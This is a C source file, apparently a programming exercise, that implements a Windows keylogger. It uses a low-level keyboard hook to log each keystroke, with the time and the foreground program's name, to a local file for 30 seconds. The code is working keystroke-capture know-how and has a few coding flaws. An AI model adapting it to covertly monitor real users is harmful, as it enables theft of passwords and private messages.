#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>
#include <WinUser.h>
#include <Psapi.h>
#include <time.h>

#define SHIFT 16
#define CAPS 20

void write_keylogs_to_file(char log_str[])
{
    // create file if doesn't exist, open if exists.
    HANDLE hFile;
    hFile = CreateFileW(L"D:\\sahar_stuff\\winApiFiles\\key_logs.txt",
        FILE_APPEND_DATA,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    DWORD dwBytesToWrite = (DWORD)strlen(log_str);
    DWORD dwBytesWritten = 0;
    BOOL writeFileResult;

    // append file
    writeFileResult = WriteFile(hFile,
        log_str,
        (DWORD)strlen(log_str),
        &dwBytesWritten,
        NULL
    );

    CloseHandle(hFile);
}

LRESULT CALLBACK kbHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        DWORD wVirtKey = kbdStruct->vkCode; // key code for the key
        DWORD wScanCode = kbdStruct->scanCode;

        BYTE lpKeyState[256];
        GetKeyboardState(lpKeyState);

        lpKeyState[SHIFT] = 0;
        lpKeyState[CAPS] = 0;

        // check if shift is pressed
        if (GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0)
            lpKeyState[SHIFT] = 0x80;

        // check if caps is pressed
        if ((GetKeyState(VK_CAPITAL) & 0x01) == 0x01)
            lpKeyState[CAPS] = 0x01;

        char result;

        // convert the input to ascii
        ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0);

        // get the current foregrounded window
        HWND foregroundWindow;
        foregroundWindow = GetForegroundWindow();

        // get the PID of the process of the foregrounded window
        DWORD pidOfProcessOfWindow;
        GetWindowThreadProcessId(foregroundWindow, &pidOfProcessOfWindow);

        // get the process by the PID
        HANDLE processOfWindow;
        processOfWindow = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidOfProcessOfWindow);

        // get name of process
        char procName[MAX_PATH];
        GetProcessImageFileNameA(processOfWindow, procName, MAX_PATH);

        char st_to_write_to_file[1024];

        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        // copy the data (in the form it would be printed in printf) to send to function
        if (result == 0x20)
        {
            snprintf(st_to_write_to_file, sizeof(st_to_write_to_file), "time: %02d:%02d:%02d, focused program: %s, key: %s\r\n", tm.tm_hour, tm.tm_min,
                tm.tm_sec, procName, "(space)");
            write_keylogs_to_file(st_to_write_to_file);
        }

        else
        {
            snprintf(st_to_write_to_file, sizeof(st_to_write_to_file), "time: %02d:%02d:%02d, focused program: %s, key: %C\r\n", tm.tm_hour, tm.tm_min,
                tm.tm_sec, procName, result);
            write_keylogs_to_file(st_to_write_to_file);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int ex4_main()
{
    int TIMEOUT = 30;
    char path[] = "D:\\sahar_stuff\\winApiFiles\\key_logs.txt";
    // delete the previous file, always.
    DeleteFileA(path);

    MSG msg;
    HHOOK hHook;

    // setting hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, kbHook, 0, 0);
    if (hHook == NULL)
    {
        printf("HOOK FAILED");
        return 0;
    }
    else
    {
        // run until reaches time limit
        time_t start_time = time(NULL);
        while (time(NULL) - start_time <= TIMEOUT)
        {
            PeekMessageW(&msg, NULL, NULL, NULL, PM_REMOVE);
        }
    }
    UnhookWindowsHookEx(hHook);
    printf("Key logs saved to: %s", path);
    return 0;
}